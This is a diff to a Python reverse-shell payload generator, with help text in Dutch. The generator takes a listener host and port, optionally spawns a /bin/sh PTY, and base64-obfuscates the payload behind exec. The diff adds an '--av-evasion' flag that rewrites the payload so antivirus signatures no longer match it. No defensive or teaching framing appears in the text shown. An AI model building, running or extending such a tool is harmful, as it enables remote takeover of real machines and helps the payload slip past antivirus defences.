@@ -12,6 +12,7 @@ parser.add_argument("lport", help="listener port", nargs="?", default="443")
 parser.add_argument("mode", help="plain of obfuscated", nargs="?", default="plain")
 parser.add_argument("platform", help="linux of windows", nargs="?", default="linux")
 parser.add_argument("--pty", action="store_true", help="PTY upgrade toevoegen (alleen linux)")
+parser.add_argument("--av-evasion", action="store_true", help="AV signature-aware obfuscatie")
 args = parser.parse_args()
 
 print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating Python reverse shell for {bcolors.OKGREEN}{args.lhost}:{args.lport}{bcolors.OKBLUE} ({args.mode}, {args.platform}){bcolors.ENDC}")
@@ -31,7 +32,11 @@ if args.pty and args.platform == "linux":
         'import pty;pty.spawn("/bin/sh")'
     )
 
-if args.mode == "obfuscated":
+if args.av_evasion:
+    from obfuscate_av import obfuscate_text
+    payload, py_stats = obfuscate_text(payload, "python")
+    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Python AV obfuscatie: {py_stats['string']} signatures aangepast{bcolors.ENDC}")
+elif args.mode == "obfuscated":
     encoded = base64.b64encode(payload.encode()).decode()
     payload = f"exec(__import__('base64').b64decode('{encoded}'))"
 
